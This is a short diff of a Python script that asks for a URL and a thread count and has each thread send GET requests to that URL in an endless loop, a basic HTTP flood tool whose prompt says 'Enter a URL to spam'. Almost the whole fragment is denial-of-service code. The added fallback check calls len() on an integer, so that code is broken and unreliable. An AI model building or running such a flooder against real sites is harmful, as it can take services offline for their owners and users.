@@ -4,11 +4,14 @@ import os
 
 os.system("cls")
 
-url = input("Enter a URL to spam: ")
+url = str(input("Enter a URL to spam: "))
 numOfThreads = int(input("Enter a number of threads to use: "))
+print(f"Spamming: {url} with {numOfThreads} threads.")
+
+if len(numOfThreads) < 1:
+    numOfThreads = 5
 
 def getRequest():
-    print("Spamming now...")
     try:
         while True:
             r = requests.get(url)
